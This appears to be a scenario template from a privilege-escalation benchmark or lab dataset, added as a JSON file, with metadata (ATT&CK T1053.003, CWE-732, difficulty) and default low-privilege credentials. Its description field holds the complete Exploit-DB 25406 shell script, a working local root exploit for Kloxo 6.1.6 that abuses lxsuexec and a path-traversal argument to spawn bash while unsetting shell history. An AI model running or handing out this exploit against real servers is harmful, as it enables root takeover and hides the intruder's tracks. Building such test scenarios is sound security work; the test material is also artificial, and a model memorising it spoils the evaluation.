@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_25406",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: Kloxo 6.1.6 - Local Privilege Escalation (OSVDB-93287)\n\nExploit source code (25406.sh):\n```\n#!/bin/sh\n# Exploit Title: Kloxo Local Privilege Escalation\n# Google Dork: inurl:kiddies\n# Date: August 2012 or so\n# Exploit Author: HTP\n# Vendor Homepage: http://lxcenter.org/\n# Software Link: [download link if available]\n# Version: 6.1.6 (Latest)\n# Tested on: CentOS 5\n# CVE : None\n# This exploit requires you to be the Apache user, or another capable of running lxsuexec.\nLXLABS=`cat /etc/passwd | grep lxlabs | cut -d: -f3`\nexport MUID=$LXLABS\nexport GID=$LXLABS\nexport TARGET=/bin/sh\nexport CHECK_GID=0\nexport NON_RESIDENT=1\necho \"unset HISTFILE HISTSAVE PROMPT_COMMAND TMOUT\" >> /tmp/w00trc\necho \"/usr/sbin/lxrestart '../../../bin/bash --init-file /tmp/w00trc #' \" > /tmp/lol\nlxsuexec /tmp/lol\n```",
+  "cve": "OSVDB-93287",
+  "exploitdb_id": "25406",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_25406",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
